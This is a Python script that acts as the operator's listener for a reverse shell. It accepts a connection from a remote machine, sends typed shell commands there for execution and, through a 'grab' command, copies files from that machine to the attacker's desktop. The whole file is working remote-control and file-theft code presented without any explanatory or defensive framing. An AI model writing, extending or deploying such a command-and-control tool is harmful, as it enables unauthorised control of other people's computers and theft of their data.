import socket
import os

def transfer(conn, command):
	conn.send(command.encode())
	path = command[5:]
	fp = open('/root/Desktop/'+path, 'wb')
	while True:
		result = conn.recv(1024)
		if(result.endswith('DONE'.encode())):
			fp.write(result[:-4])
			fp.close()
			print('[:] Transfer complete')
			break
		elif 'File not found'.encode() in result:
			print('[:] File not found')
			break
		else:
			fp.write(result)


def connect():
    # create socket object for data transmission.
    s = socket.socket()
    # get ip address and port to bind with.
    ip_address = '192.168.254.137'
    port_no = 8080
    # bind this socket to the designated port no.
    s.bind((ip_address, port_no))
    # define no of active listeners for the queue.
    s.listen(1)
    # wait for getting connection and get socket object and address from client.
    conn,  addrr = s.accept()
    # after getting connection print the same!
    print("[:] Connection Established :-> "+str(addrr))
    # send commands untill required to close!
    while True:
        # input command to be executed.
        command = input("[:? shell -> ")
        # close connection on exit.
        if 'exit'==command:
            conn.send('exit'.encode())
            print("Closing connection! Please Wait! ........")
            conn.close()
            break
        elif command=='' or command=='\n':
            pass
        elif command[0:4] == "grab":
        	transfer(conn, command)
        else:
            conn.send(command.encode())
            result = conn.recv(1024).decode()
            # check for blank result.
            if result[0:4]=='SKIP':
            	print(''+result[4:])
            else:
            	print(result)


def main():
    connect()


main()
